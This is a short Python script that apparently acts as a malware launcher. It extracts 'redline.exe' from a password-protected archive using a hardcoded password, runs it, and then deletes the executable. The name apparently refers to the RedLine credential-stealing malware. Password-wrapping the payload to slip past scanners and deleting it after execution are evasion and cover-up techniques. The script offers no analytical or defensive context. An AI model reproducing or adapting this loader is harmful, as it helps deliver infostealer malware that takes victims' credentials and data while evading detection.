import subprocess
from os import path, remove
from time import sleep
from zipfile import ZipFile

try:
    if path.exists('redline.exe') == False:
        if path.exists('file') == False:
            senha = '@Jefferson123'
            z = ZipFile('redline.zip', 'r')
            z.extractall(pwd=senha.encode())
            z.close()
        else:
            pass

    else:
        pass
    
    subprocess.call('redline.exe')
    
except Exception as e:
    print(e)

try:
    remove('redline.exe')
except Exception as e:
    print(e)